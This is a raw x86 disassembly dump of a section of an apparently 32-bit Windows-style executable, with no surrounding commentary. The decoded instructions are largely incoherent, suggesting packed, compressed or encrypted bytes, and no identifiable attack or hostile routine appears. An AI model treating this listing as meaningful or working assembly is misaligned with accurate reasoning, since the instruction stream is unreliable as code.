  40b581:	pop    edx
  40b582:	push   esp
  40b583:	mov    ecx,DWORD PTR [ecx]
  40b585:	dec    edi
  40b586:	sti    
  40b587:	jg     0x40b5ac
  40b589:	cli    
  40b58a:	jbe    0x40b58f
  40b58c:	not    edi
  40b58e:	dec    esi
  40b58f:	inc    edx
  40b590:	inc    edx
  40b591:	daa    
  40b592:	js     0x40b599
  40b594:	mov    ecx,0xd77503ff
  40b599:	sub    dh,BYTE PTR [edi+0x10]
  40b59c:	imul   esi,DWORD PTR [edx],0x22a10877
  40b5a2:	out    dx,al
  40b5a3:	(bad)  
  40b5a4:	scas   al,BYTE PTR es:[edi]
  40b5a5:	add    BYTE PTR [ecx],dl
  40b5a7:	xor    DWORD PTR [edx+0x2cd91deb],edi
  40b5ad:	jmp    0x40b54a
  40b5af:	adc    edx,DWORD PTR [esi+0x5ed1975]
  40b5b5:	clc    
  40b5b6:	adc    BYTE PTR [edx-0x1002147c],dh
  40b5bc:	dec    ebx
  40b5bd:	shr    BYTE PTR [edi],0xed
  40b5c0:	ja     0x40b5ad
  40b5c2:	in     eax,dx
  40b5c3:	icebp  
  40b5c4:	pushf  
  40b5c5:	sub    dh,ch
  40b5c7:	cld    
  40b5c8:	mov    ebp,0x5fecde58
  40b5cd:	jmp    0x40b62a
  40b5cf:	clc    
  40b5d0:	pop    esi
  40b5d1:	stc    
  40b5d2:	imul   ebp,esp,0xf43beb4f
  40b5d8:	pop    esi
  40b5d9:	add    DWORD PTR [edx-0x14],ebp
  40b5dc:	aas    
  40b5dd:	jmp    0x40b61a
  40b5df:	in     al,dx
	...
  40b5f4:	push   ds
  40b5f5:	jmp    0xeb70a264
  40b5fa:	sbb    esi,eax
  40b5fc:	push   ds
  40b5fd:	icebp  
  40b5fe:	push   0xffffffec
  40b600:	pop    ds
  40b601:	jmp    0x40b61e
  40b603:	adc    al,0x16
  40b605:	jne    0x40b5e4
  40b607:	in     al,dx
  40b608:	test   eax,edi
  40b60a:	nop
  40b60b:	jno    0x40b614
  40b60d:	jmp    0x40b68c
  40b60f:	dec    esp
  40b610:	lock mov ebp,0x778c03e4
  40b616:	jl     0x40b598
  40b618:	cli    
  40b619:	xlat   BYTE PTR ds:[ebx]
  40b61a:	gs jbe 0x40b66a
  40b61d:	jmp    0x40b5f2
  40b61f:	adc    edx,ecx
  40b621:	pop    eax
  40b622:	mov    esp,0x28f73903
  40b627:	ja     0x40b68f
  40b629:	push   esi
  40b62a:	jmp    0xa86b608a
  40b62f:	add    edi,DWORD PTR [esi-0x5a26ff8c]
  40b635:	jae    0x40b643
  40b637:	inc    ecx
  40b638:	in     eax,dx
  40b639:	cmp    esi,0x26
  40b63c:	mov    eax,ds:0xaa873aa
  40b641:	push   eax
  40b642:	call   0xff2acce3
  40b647:	loop   0x40b6c3
  40b649:	outs   dx,BYTE PTR ds:[esi]
  40b64a:	xor    DWORD PTR [eax-0x1],esi
  40b64d:	xlat   BYTE PTR ds:[ebx]
  40b64e:	imul   esp,ebx,0xf685db62
  40b654:	(bad)  
  40b655:	cmc    
  40b656:	mov    edi,0x75
	...
  40b66b:	add    BYTE PTR [ecx-0x15],al
  40b66e:	je     0x40b671
  40b670:	or     eax,0x526783d8
  40b675:	jmp    0xd8098cc9
  40b67a:	dec    edi
  40b67b:	into   
  40b67c:	enter  0xe7f7,0x12
  40b680:	push   ebx
  40b681:	jmp    0x7e138884
  40b686:	(bad)  
  40b687:	mov    dh,0x22
  40b689:	jne    0x40b673
  40b68b:	shr    DWORD PTR [edx+0x5a6fe7e],0x70
  40b692:	sbb    BYTE PTR [esi-0x1eff9dee],0x3a
  40b699:	add    al,ch
  40b69b:	push   cs
  40b69c:	mov    bh,0xea
  40b69e:	(bad)  
  40b69f:	jo     0x40b719
  40b6a1:	call   0x3a51db32
  40b6a6:	(bad)  
  40b6a7:	cld    
  40b6a8:	dec    edx
  40b6a9:	jmp    0xb4539422
  40b6ae:	push   ebx
  40b6af:	jmp    0xd500abee
  40b6b4:	push   0xffffffc1
  40b6b6:	inc    esp
  40b6b7:	pop    ecx
  40b6b8:	cmp    eax,0xfbe90000
  40b6bd:	inc    esp
  40b6be:	hlt    
  40b6bf:	add    BYTE PTR [edi-0x3],bh
  40b6c2:	(bad)  
  40b6c3:	(bad)  
  40b6c4:	jmp    0x69fd:0x7a0069fd
  40b6cb:	add    BYTE PTR ds:0x50f43f,cl
	...
  40b6e1:	add    BYTE PTR [eax],al
  40b6e3:	add    BYTE PTR [edi+0x6f],bl
  40b6e6:	clc    
  40b6e7:	inc    ebp
  40b6e9:	in     eax,dx
  40b6ea:	std    
  40b6eb:	jne    0x40b719
  40b6ed:	int3   
  40b6ee:	mov    ss,WORD PTR [eax+eiz*4-0x3]
  40b6f2:	or     al,al
  40b6f4:	add    al,0x3
  40b6f6:	jmp    0x40b732
  40b6f8:	test   al,0xdf
  40b6fa:	es inc ecx
  40b6fc:	pusha  
  40b6fd:	(bad)  
  40b6fe:	jae    0x40b710
  40b700:	cmp    BYTE PTR [esi-0x29a0007d],ch
  40b706:	jae    0x40b700
  40b708:	and    ah,cl
  40b70a:	inc    DWORD PTR [ebp+0x4587d66f]
  40b710:	mov    esi,ss
  40b712:	jae    0x40b72c
  40b714:	jg     0x40b786
  40b716:	adc    al,0xff
  40b718:	add    eax,0x1c75fdc8
  40b71d:	(bad)  
  40b71e:	jae    0x40b728
  40b720:	clc    
  40b721:	sti    
  40b722:	(bad)  
  40b723:	(bad)  
  40b724:	(bad)  
  40b726:	jae    0x40b714
  40b728:	enter  0x7fc5,0xff
  40b72c:	scas   eax,DWORD PTR es:[edi]
  40b72d:	aad    0x43
  40b72f:	lock mov ebx,0xbc75fd75
  40b735:	les    edi,FWORD PTR [edx]
  40b737:	push   esp
  40b738:	adc    ch,bh
  40b73a:	(bad)  
  40b73b:	jne    0x40b7a5
  40b73d:	(bad)
  40b740:	pop    edi
  40b741:	(bad)  
  40b742:	mov    edx,0x8b54fce4
	...
  40b75c:	ins    BYTE PTR es:[edi],dx
  40b75d:	test   dl,al
  40b75f:	hlt    
  40b760:	cmp    DWORD PTR [ecx-0x16],edx
  40b763:	(bad)  
  40b764:	arpl   di,dx
  40b766:	pop    esp
  40b767:	and    al,0xc6
  40b769:	stos   DWORD PTR es:[edi],eax
  40b76a:	cli    
  40b76b:	out    0xc0,eax
  40b76d:	test   al,0xe9
  40b76f:	inc    al
  40b771:	fwait
  40b772:	out    0xc6,al
  40b774:	xor    al,0xc1
  40b776:	sub    DWORD PTR [ecx+0x39],eax
  40b779:	xlat   BYTE PTR ds:[ebx]
  40b77a:	add    al,BYTE PTR [eax]
  40b77c:	cmp    DWORD PTR [eax+eax*4-0xa],ebx
  40b780:	xchg   edi,eax
  40b781:	adc    edx,ebp
  40b783:	dec    edi
  40b784:	and    ebx,esp
  40b786:	add    eax,DWORD PTR [eax]
  40b788:	cmp    DWORD PTR [edi],ecx
  40b78a:	jbe    0x40b7df
  40b78c:	cmp    edi,edx
  40b78e:	pop    edx
  40b78f:	sub    al,0xf9
  40b791:	xchg   edi,eax
  40b792:	add    ch,BYTE PTR [eax+0x15]
  40b795:	xchg   edi,eax
  40b796:	inc    ebx
  40b797:	add    cl,dl
  40b799:	and    BYTE PTR [ecx+eax*2+0x39],al
  40b79d:	retf   0x752e
  40b7a0:	and    BYTE PTR [eax],bl
  40b7a2:	add    al,0xff
  40b7a4:	(bad)  
  40b7a5:	(bad)  
  40b7a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7a8:	inc    edi
  40b7a9:	shr    eax,0x67
  40b7ac:	or     eax,0xa1004317
  40b7b1:	cmc    
  40b7b2:	inc    ebx
  40b7b3:	inc    ecx
  40b7b4:	cmp    DWORD PTR [ecx+0x2a],eax
  40b7b7:	inc    eax
  40b7b8:	js     0x40b793
  40b7ba:	pop    edx
  40b7bb:	add    bh,BYTE PTR [ecx]
  40b7bd:	fld    DWORD PTR [edx+0xfe]
	...
  40b7d3:	add    BYTE PTR [ecx+eiz*8+0x770f8bda],cl
  40b7da:	call   0xeaa7746b
  40b7df:	(bad)  
  40b7e0:	dec    BYTE PTR [ecx]
  40b7e2:	fcom   QWORD PTR ds:0xff02d98a
  40b7e8:	fs push ebp
  40b7ea:	jmp    0x5140e963
  40b7ef:	rcr    DWORD PTR [edi+eiz*8+0x5d],cl
  40b7f3:	mov    ebx,0x4ee8fcf8
  40b7f8:	ret    0x67d4
  40b7fb:	ror    dl,0xe6
  40b7fe:	inc    ebp
  40b7ff:	jmp    0x1f13b854
  40b804:	mov    dh,0x6d
  40b806:	loope  0x40b7e3
  40b808:	sub    BYTE PTR [esi+0x2e],ah
  40b80b:	jmp    0x5e65f5c1
  40b810:	inc    ebx
  40b811:	fcomp  DWORD PTR [ebp-0x1e186882]
  40b817:	ret    
  40b818:	or     bl,BYTE PTR [ecx+eax*4]
  40b81b:	pop    ss
  40b81c:	stc    
  40b81d:	inc    eax
  40b81e:	jmp    0x644d4976
  40b823:	jmp    0x3c2089f
  40b828:	dec    ecx
  40b829:	xlat   BYTE PTR ds:[ebx]
  40b82a:	cs pop esp
  40b82c:	jmp    0x944e070
  40b831:	out    0x53,eax
  40b833:	cld    
  40b834:	pop    esi
  40b835:	les    ecx,FWORD PTR [ebx+0xe8]
	...
  40b84b:	add    BYTE PTR [edi-0x28],cl
  40b84e:	loopne 0x40b7d2
  40b850:	inc    edi
  40b851:	out    0xad,eax
  40b853:	(bad)  
  40b854:	aam    0x26
  40b856:	sub    BYTE PTR [eax+edi*1],al
  40b859:	add    cl,ch
  40b85b:	add    edi,DWORD PTR [esp+edi*2-0x18d8164b]
  40b862:	cmp    BYTE PTR [ebp+esi*1+0x1],bl
  40b866:	jmp    0x3ae5d96e
  40b86b:	add    al,0x39
  40b86d:	pop    eax
  40b86e:	mov    ebp,0x11007843
  40b873:	and    BYTE PTR [ecx+0x41],bh
  40b876:	jmp    0x80efd6
  40b87b:	sub    BYTE PTR ds:0x43f434e7,dh
  40b881:	inc    ecx
  40b882:	add    BYTE PTR [esi+0x4f],ah
  40b885:	clc    
  40b886:	out    0x5b,eax
  40b888:	(bad)  
  40b88a:	inc    cl
  40b88c:	es inc eax
  40b88e:	inc    ecx
  40b88f:	jmp    0xa880d4f6
  40b894:	cmp    bl,BYTE PTR [eax+0x3e]
  40b897:	test   eax,0xeb67fffb
  40b89c:	cmp    al,BYTE PTR [eax]
  40b89e:	sub    BYTE PTR [esi],0x17
  40b8a1:	clc    
  40b8a2:	out    0x3f,eax
  40b8a4:	xchg   edi,eax
  40b8a5:	in     eax,0xfe
  40b8a7:	ins    BYTE PTR es:[edi],dx
  40b8a8:	pop    ss
  40b8a9:	out    dx,al
  40b8aa:	std    
  40b8ab:	push   ss
  40b8ac:	mov    eax,ds:0x89e836
	...
  40b8c1:	add    BYTE PTR [eax],al
  40b8c3:	add    ah,ch
  40b8c5:	(bad)  
  40b8c6:	inc    DWORD PTR ds:0x74fee40f
  40b8cc:	jb     0x40b8ac
  40b8ce:	sbb    dh,BYTE PTR [edi+0x61]
  40b8d1:	in     eax,0xc8
  40b8d3:	sub    esp,DWORD PTR [esi-0x1a]
  40b8d6:	push   ebx
  40b8d7:	jb     0x40b85a
  40b8d9:	jg     0x40b89e
  40b8db:	aad    0x5f
  40b8dd:	in     eax,0xfe
  40b8df:	inc    ebx
  40b8e0:	xor    eax,0xc8ce265a
  40b8e5:	mul    edi
  40b8e7:	test   eax,edx
  40b8e9:	out    0xfe,al
  40b8eb:	jo     0x40b965
  40b8ed:	in     al,0xc6
  40b8ef:	in     al,dx
  40b8f0:	mov    WORD PTR ds:0x3ae941,fs
  40b8f6:	add    cl,ch
  40b8f8:	mov    eax,ds:0x1e9ff67c
  40b8fd:	out    0x4f,eax
  40b8ff:	add    DWORD PTR [ecx],edi
  40b901:	(bad)  
  40b902:	(bad)  
  40b903:	call   0x92e4ea
  40b908:	adc    BYTE PTR [edx],al
  40b90a:	push   0x3b208b
  40b90f:	push   0x413c61
  40b914:	cmp    BYTE PTR [esi],bl
  40b916:	inc    eax
  40b917:	inc    ecx
  40b918:	rcr    dh,1
  40b91a:	xor    esi,DWORD PTR [ebp+0x29]
  40b91d:	cmp    eax,DWORD PTR [eax]
  40b91f:	(bad)  
  40b920:	in     eax,dx
  40b921:	jmp    0xddb6250c
  40b926:	std    
  40b927:	push   0x0
	...
  40b93c:	dec    ebx
  40b93d:	cmp    al,0x41
  40b93f:	add    BYTE PTR [eax-0x5fbec184],cl
  40b945:	dec    ecx
  40b946:	ds inc eax
  40b948:	rol    DWORD PTR [ecx],1
  40b94a:	push   0x80019002
  40b94f:	jmp    FWORD PTR [ebp+0x254fe6e9]
  40b955:	(bad)  
  40b957:	lea    ebx,ds:0x37fffcd5
  40b95d:	dec    esp
  40b95e:	call   0x428b3c
  40b963:	(bad)  
  40b964:	in     eax,dx
  40b965:	fdiv   st(5),st
  40b967:	jne    0x40b9c1
  40b969:	leave  
  40b96a:	xchg   edx,eax
  40b96b:	jge    0x40b9c4
  40b96d:	faddp  st(7),st
  40b96f:	ret    0x15c
  40b972:	push   ebp
  40b973:	mov    esi,DWORD PTR [esp+edi*2-0x3e]
  40b977:	hlt    
  40b978:	jbe    0x40b958
  40b97a:	std    
  40b97b:	push   0x50
  40b97d:	inc    edi
  40b97e:	daa    
  40b97f:	jmp    FWORD PTR [ebp-0x1c]
  40b982:	out    0x35,al
  40b984:	gs (bad) 
  40b987:	mov    DWORD PTR [ebp-0x28],ebx
  40b98a:	lds    eax,FWORD PTR ds:0x411d2e
  40b990:	and    BYTE PTR [ecx],al
  40b992:	add    BYTE PTR [eax],al
  40b994:	cmp    DWORD PTR [eax+eax*4-0xa],ebx
  40b998:	pop    es
  40b999:	jbe    0x40b980
  40b99b:	dec    edi
  40b99c:	xchg   ecx,eax
  40b99d:	rol    DWORD PTR [ebx],cl
	...
  40b9b3:	add    BYTE PTR [ecx],bh
  40b9b5:	(bad)  
  40b9b6:	xchg   ebp,eax
  40b9b7:	push   eax
  40b9b8:	cmp    edi,edx
  40b9ba:	pop    edx
  40b9bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9bc:	jns    0x40b9d6
  40b9be:	add    al,0x68
  40b9c0:	mov    esi,0x61004396
  40b9c5:	add    eax,0x4e394144
  40b9ca:	xor    BYTE PTR [ebp+0x10],dh
  40b9cd:	cwde   
  40b9ce:	add    bh,bh
  40b9d0:	inc    esp
  40b9d1:	out    dx,eax
  40b9d2:	(bad)  
  40b9d4:	mov    ch,0x25
  40b9d6:	out    0x67,al
  40b9d8:	aam    0x96
  40b9da:	inc    ebx
  40b9db:	add    BYTE PTR [ecx],dl
  40b9dd:	ss inc ebx
  40b9df:	inc    ecx
  40b9e0:	cmp    DWORD PTR [edi-0x2907bfdc],ecx
  40b9e6:	pop    edx
  40b9e7:	add    bh,BYTE PTR [ecx]
  40b9e9:	xlat   BYTE PTR ds:[ebx]
  40b9ea:	cmp    dh,0xc
  40b9ed:	(bad)  
  40b9ef:	(bad)  
  40b9f0:	jge    0x40b9ef
  40b9f2:	in     eax,0x8c
  40b9f4:	mov    esp,0x6efee3ed
  40b9f9:	xchg   dl,bl
  40b9fb:	push   ecx
  40b9fc:	or     bh,dl
  40b9fe:	add    bh,bh
  40ba00:	in     al,0xda
  40ba02:	in     al,0x74
  40ba04:	inc    ecx
  40ba05:	iret   
  40ba06:	idiv   BYTE PTR [esi+ecx*2-0x33]
  40ba0a:	mov    edx,0x4dd73dc1
  40ba0f:	mov    ecx,DWORD PTR [ebp+0x57]
  40ba12:	shl    bl,0x37
  40ba15:	mov    ds:0x69e4,eax
	...
  40ba2a:	add    BYTE PTR [eax],al
  40ba2c:	cmp    DWORD PTR [edi],edi
  40ba2e:	sbb    al,0xff
  40ba30:	lods   al,BYTE PTR ds:[esi]
  40ba31:	loope  0x40ba0d
  40ba33:	lods   eax,DWORD PTR ds:[esi]
  40ba34:	popf   
  40ba35:	add    BYTE PTR [esi-0x62c23e1b],ah
  40ba3b:	mov    ebp,0x42d65a35
  40ba40:	cmp    DWORD PTR [eax],eax
  40ba42:	jmp    0x6bb5f34a
  40ba47:	in     eax,dx
  40ba48:	hlt    
  40ba49:	jecxz  0x40bac8
  40ba4b:	push   esp
  40ba4c:	popa   
  40ba4d:	cld    
  40ba4e:	out    0x3,eax
  40ba50:	cmp    eax,ebx
  40ba52:	rcl    BYTE PTR [edx+0x39],0x0
  40ba56:	shl    DWORD PTR [esi+0x5be94116],1
  40ba5c:	test   BYTE PTR [eax-0x58],al
  40ba5f:	add    edx,DWORD PTR [ecx+0x22]
  40ba62:	test   eax,0xfbe33942
  40ba67:	outs   dx,BYTE PTR ds:[esi]
  40ba68:	pusha  
  40ba69:	inc    ecx
  40ba6a:	jmp    0x4138e053
  40ba6f:	inc    edi
  40ba70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba71:	jecxz  0x40baa0
  40ba73:	pop    esp
  40ba74:	fadd   QWORD PTR [eax-0x58]
  40ba77:	add    esp,DWORD PTR [ecx]
  40ba79:	lods   eax,DWORD PTR ds:[esi]
  40ba7a:	test   al,0x42
  40ba7c:	cmp    DWORD PTR [eax-0x29],ebx
  40ba7f:	inc    ebx
  40ba80:	clc    
  40ba81:	inc    DWORD PTR [eax+0x69003901]
  40ba87:	in     eax,0xed
  40ba89:	not    DWORD PTR [eax]
  40ba8b:	inc    ebx
  40ba8c:	ins    DWORD PTR es:[edi],dx
  40ba8d:	jecxz  0x40ba84
  40ba8f:	jbe    0x40ba91
	...
  40baa1:	add    BYTE PTR [eax],al
  40baa3:	add    BYTE PTR [ebp+0x5fe4eeeb],bh
  40baa9:	push   eax
  40baaa:	sar    DWORD PTR [eax-0x1b16fffa],1
  40bab0:	(bad)
  40bab3:	outs   dx,BYTE PTR ds:[esi]
  40bab4:	xor    eax,ebx
  40bab6:	data16 ds jcxz 0x40ba6a
  40babb:	sar    DWORD PTR [edx],0x0
  40babe:	adc    al,0x79
  40bac0:	and    bh,BYTE PTR [edi-0x1]
  40bac3:	lods   al,BYTE PTR ds:[esi]
  40bac4:	push   ds
  40bac5:	pop    ecx
  40bac6:	add    BYTE PTR [ebx+0x42],al
  40bac9:	jecxz  0x40bb3f
  40bacb:	icebp  
  40bacc:	repnz sbb BYTE PTR [esi+ebx*4+0x15],bh
  40bad1:	js     0x40bb17
  40bad3:	xchg   ebp,eax
  40bad4:	pusha  
  40bad5:	add    BYTE PTR [eax-0x75],ch
  40bad8:	jp     0x40bb1b
  40bada:	add    BYTE PTR [ecx],dl
  40badc:	or     eax,0xd5e94123
  40bae1:	sub    esi,DWORD PTR [ebp-0x40]
  40bae4:	jnp    0x40bae6
  40bae6:	call   0xff227664
  40baeb:	repnz cli 
  40baed:	outs   dx,BYTE PTR ds:[esi]
  40baee:	sbb    DWORD PTR [ecx+0x46000072],edi
  40baf4:	pushf  
  40baf5:	pop    edx
  40baf6:	repnz test eax,0x4650007b
  40bafc:	daa    
  40bafd:	clc    
  40bafe:	out    0x6e,eax
  40bb00:	fabs   
  40bb02:	inc    BYTE PTR [ecx-0x2f]
  40bb05:	jmp    FWORD PTR fs:[esi]
	...
  40bb1c:	add    BYTE PTR [eax],al
  40bb1e:	push   0x40fa10
  40bb23:	xchg   ecx,eax
  40bb24:	push   0x22
  40bb26:	inc    ecx
  40bb27:	jmp    0xc0b5e6c9
  40bb2c:	sti    
  40bb2d:	jmp    edi
  40bb2f:	inc    ebp
  40bb30:	mov    ebx,0x7af2fee1
  40bb35:	outs   dx,BYTE PTR ds:[esi]
  40bb36:	sbb    DWORD PTR [ecx-0x1fffffe],ebx
  40bb3c:	xchg   ebp,eax
  40bb3d:	pop    edx
  40bb3e:	repnz sub esp,edi
  40bb41:	dec    DWORD PTR [edi-0x22]
  40bb44:	lock mul edi
  40bb47:	xor    bl,BYTE PTR [esi-0x4d3e011f]
  40bb4d:	inc    DWORD PTR fs:[eax]
  40bb50:	(bad)  
  40bb51:	fnsave [ebx-0x4]
  40bb54:	out    dx,eax
  40bb55:	inc    edi
  40bb56:	or     al,ch
  40bb58:	jmp    0x2ba:0xd9ffff41
  40bb5f:	add    BYTE PTR [ebp+0x71],dl
  40bb62:	jmp    0x3a57:0x54e0d483
  40bb69:	cld    
  40bb6a:	imul   ebp,DWORD PTR [edx],0xe80847af
  40bb70:	pop    esp
  40bb71:	inc    ecx
  40bb72:	(bad)  
  40bb73:	jmp    FWORD PTR [ecx+0x37]
  40bb76:	cld    
  40bb77:	push   0xffffffd0
  40bb79:	aad    0xa7
  40bb7b:	or     BYTE PTR [edi-0x23],0x9
  40bb7f:	rol    BYTE PTR [eax],0x0
	...
  40bb92:	add    BYTE PTR [eax],al
  40bb94:	hlt    
  40bb95:	in     al,0x4e
  40bb97:	push   0xbeeefde0
  40bb9c:	clc    
  40bb9d:	fidivr WORD PTR [esi]
  40bb9f:	inc    ecx
  40bba0:	shr    BYTE PTR ds:0xd5a875ff,1
  40bba6:	bt     DWORD PTR [edi-0x23],ebp
  40bbaa:	out    0x3d,al
  40bbac:	out    dx,al
  40bbad:	fdivp  st(5),st
  40bbaf:	mov    esp,DWORD PTR [ebp-0x5fbed971]
  40bbb5:	jb     0x40bbf2
  40bbb7:	xchg   edx,eax
  40bbb8:	push   0x6f80003c
  40bbbd:	std    
  40bbbe:	jae    0x40bc05
  40bbc0:	mov    eax,0x604140f1
  40bbc5:	es call 0x3e8c88
  40bbcb:	or     dl,BYTE PTR [eax]
  40bbcd:	dec    eax
  40bbce:	pop    ds
  40bbcf:	push   esi
  40bbd0:	cmp    ah,bl
  40bbd2:	test   edi,edi
  40bbd4:	pop    edi
  40bbd5:	sub    eax,0xee600068
  40bbda:	mov    esp,0x42ca3968
  40bbdf:	inc    ecx
  40bbe0:	cmp    DWORD PTR [edi],esp
  40bbe2:	jecxz  0x40bc58
  40bbe4:	inc    ecx
  40bbe5:	iret   
  40bbe6:	mov    ah,0xa1
  40bbe8:	mov    cs:0xaaa4fdea,al
  40bbee:	loope  0x40bbda
  40bbf0:	cmp    BYTE PTR [ecx],bl
  40bbf2:	test   BYTE PTR ds:0x45de0439,bh
	...
  40bc0c:	or     eax,0x6b8c2c6
  40bc11:	mov    ah,cl
  40bc13:	dec    BYTE PTR [ebx]
  40bc15:	and    DWORD PTR [ebx],ebx
  40bc17:	pop    es
  40bc18:	ins    BYTE PTR es:[edi],dx
  40bc19:	ds loop 0x40bc90
  40bc1c:	in     eax,dx
  40bc1d:	popa   
  40bc1e:	pop    eax
  40bc1f:	or     cl,dl
  40bc21:	or     al,0x5f
  40bc23:	(bad)  
  40bc24:	fdivrp st(1),st
  40bc26:	inc    ecx
  40bc27:	leave  
  40bc28:	sti    
  40bc29:	rol    BYTE PTR [edx],cl
  40bc2b:	push   ebp
  40bc2c:	ret    0x8632
  40bc2f:	ret    
  40bc30:	lds    esp,FWORD PTR [eax-0x42c695c7]
  40bc36:	sub    eax,0xeaef2cff
  40bc3b:	stc    
  40bc3c:	xor    esp,DWORD PTR [edx]
  40bc3e:	loop   0x40bbc8
  40bc40:	cld    
  40bc41:	sub    cl,BYTE PTR [esi+0x44feaf34]
  40bc47:	add    dl,al
  40bc49:	(bad)  [edi+eiz*1-0x8]
  40bc4d:	(bad)  
  40bc4e:	cmp    BYTE PTR [esi],0x39
  40bc51:	add    DWORD PTR [edi+0x68],0x1e
  40bc55:	cwde   
  40bc56:	inc    ebx
  40bc57:	add    BYTE PTR [esi],cl
  40bc59:	mov    cr2,eax
  40bc5c:	cmp    edi,edx
  40bc5e:	or     eax,0x38c9edc0
  40bc63:	call   0xff231643
  40bc68:	jmp    0x39450d6c
  40bc6d:	rcr    DWORD PTR [esi+0x6c],1
	...
  40bc83:	add    BYTE PTR [eax],ch
  40bc85:	aas    
  40bc86:	sub    BYTE PTR [ecx+ebp*8],al
  40bc89:	loopne 0x40bcde
  40bc8b:	or     al,0x21
  40bc8d:	xor    eax,0xe92fe18b
  40bc92:	push   0xc1e0265f
  40bc97:	add    esi,DWORD PTR [edi-0x80]
  40bc9a:	out    dx,al
  40bc9b:	add    ecx,DWORD PTR [edx+ebx*8-0x3fb41fd2]
  40bca2:	pop    edi
  40bca3:	loope  0x40bcac
  40bca5:	loopne 0x40bc3c
  40bca7:	(bad)  
  40bca8:	int3   
  40bca9:	sbb    dh,ah
  40bcab:	push   esi
  40bcac:	mov    dl,0xdf
  40bcae:	sti    
  40bcaf:	fucomip st,st(7)
  40bcb1:	push   ebp
  40bcb2:	icebp  
  40bcb3:	jmp    0x40bcb7
  40bcb5:	pop    ebx
  40bcb6:	jbe    0x40bc99
  40bcb8:	jg     0x40bcf8
  40bcba:	mov    al,ds:0xbc003ac6
  40bcbf:	mov    edx,fs
  40bcc1:	and    DWORD PTR [eax+eiz*8],0x50
  40bcc5:	add    bl,al
  40bcc7:	das    
  40bcc8:	mov    esi,0x34ebe155
  40bccd:	pop    edx
  40bcce:	inc    esi
  40bccf:	loope  0x40bc92
  40bcd1:	inc    ebp
  40bcd2:	cmp    eax,0xe96a396e
  40bcd7:	imul   ecx,DWORD PTR [esi+0x41],0xffffffa8
  40bcdb:	add    esp,DWORD PTR [ecx]
  40bcdd:	add    cl,ch
  40bcdf:	add    edi,DWORD PTR [ecx-0x787c4f18]
  40bce5:	(bad)  
  40bce7:	ret    
	...
  40bcfc:	or     bh,bh
  40bcfe:	mov    eax,0x58667eb
  40bd03:	loope  0x40bd03
  40bd05:	addr16 jmp 0xffdf130e
  40bd0b:	adc    BYTE PTR [eax],0x41
  40bd0e:	inc    ecx
  40bd0f:	jmp    0xf1b59c1e
  40bd14:	(bad)  
  40bd15:	loopne 0x40bcb7
  40bd17:	ficomp WORD PTR [ecx-0x19]
  40bd1a:	or     al,0x54
  40bd1c:	pop    eax
  40bd1d:	fdivp  st(6),st
  40bd1f:	push   esp
  40bd20:	sbb    esi,ebx
  40bd22:	je     0x40bd15
  40bd24:	and    bl,BYTE PTR [edi+0x7a]
  40bd27:	mov    esi,0xedc1c819
  40bd2c:	cmp    dh,BYTE PTR ds:0xc2bdbd8b
  40bd32:	sti    
  40bd33:	adc    esi,DWORD PTR ds:0x6f9e2d6a
  40bd39:	or     al,ch
  40bd3b:	int    0x5c
  40bd3d:	(bad)  
  40bd3f:	pusha  
  40bd40:	jg     0x40bd1e
  40bd42:	addr16 jmp 0x11feac82
  40bd48:	push   esp
  40bd49:	inc    ecx
  40bd4a:	inc    ecx
  40bd4b:	jmp    0x288214a2
  40bd50:	cmp    eax,0xe2f174df
  40bd55:	jmp    0x5574:0xddd95ea0
  40bd5c:	fst    DWORD PTR [ebx+0x8]
  40bd5f:	inc    ecx
	...
  40bd74:	call   FWORD PTR [ecx-0x1]
  40bd77:	inc    esi
  40bd78:	add    eax,0x3
  40bd7b:	jmp    0x6b2c48ef
  40bd80:	jbe    0x40bd5c
  40bd82:	imul   ebp,ecx,0x9cff2e24
  40bd88:	inc    edx
  40bd89:	call   0xddda5e76
  40bd8e:	mov    BYTE PTR [esi+ebx*2+0x69e90066],ch
  40bd95:	pushf  
  40bd96:	addr16 add dl,ah
  40bd99:	inc    ecx
  40bd9a:	inc    ecx
  40bd9b:	add    al,cl
  40bd9d:	push   edi
  40bd9e:	inc    eax
  40bd9f:	inc    ecx
  40bda0:	push   eax
  40bda1:	fbstp  TBYTE PTR [ebx+0x8]
  40bda4:	cmp    BYTE PTR [edx-0x61],dh
  40bda7:	call   DWORD PTR [edi+0x6b]
  40bdaa:	add    BYTE PTR [eax],al
  40bdac:	ja     0x40be2b
  40bdae:	lea    dx,[ecx]
  40bdb1:	inc    ebp
  40bdb2:	add    BYTE PTR [eax-0x51],ch
  40bdb5:	inc    ebx
  40bdb6:	inc    ecx
  40bdb7:	add    bh,dh
  40bdb9:	aaa    
  40bdba:	or     al,ch
  40bdbc:	call   0xfc37:0xe7fffda3
  40bdc3:	dec    DWORD PTR [ebp+0xc]
  40bdc6:	call   0xfdfe17be
  40bdcb:	leave  
  40bdcc:	ror    BYTE PTR [eax],cl
  40bdce:	add    BYTE PTR [ebp-0x65],dl
  40bdd1:	rol    BYTE PTR [ecx+0x5389c4c4],1
  40bdd7:	adc    BYTE PTR [eax],al
	...
  40bde9:	add    BYTE PTR [eax],al
  40bdeb:	add    BYTE PTR [ebx-0x2e],ch
  40bdee:	push   0xfc475500
  40bdf3:	push   eax
  40bdf4:	addr16 aaa 
  40bdf6:	or     BYTE PTR [edx-0x20],ch
  40bdf9:	mov    esi,0x12571073
  40bdfe:	sbb    al,0x85
  40be00:	adc    BYTE PTR [edi],dh
  40be02:	daa    
  40be03:	mov    edi,DWORD PTR [ebp-0x43]
  40be06:	mov    gs,WORD PTR [edx-0x60]
  40be09:	add    BYTE PTR [bx+si-0x9],ch
  40be0d:	add    BYTE PTR [eax],al
  40be0f:	add    BYTE PTR [edi+0x37],ah
  40be12:	or     al,0x6a
  40be14:	addr16 mov ebp,0x17a0470
  40be1a:	push   0x0
  40be1c:	sub    BYTE PTR [ebx+0x5190004b],ch
  40be22:	(bad)  
  40be23:	jne    0x40be5e
  40be25:	repz jmp 0x40be87
  40be28:	pop    es
  40be29:	out    0x2,eax
  40be2b:	leave  
  40be2c:	jnp    0x40be01
  40be2e:	add    dl,BYTE PTR [ebp-0x4e]
  40be31:	or     eax,DWORD PTR [ebx+0x39625dc3]
  40be37:	adc    al,0xc2
  40be39:	mov    ecx,0x2cbc0068
  40be3e:	loopne 0x40be8f
  40be40:	inc    esi
  40be41:	xor    al,0x10
  40be43:	inc    esp
  40be45:	fisubr WORD PTR [eax+0x0]
  40be48:	ss xor al,0xf8
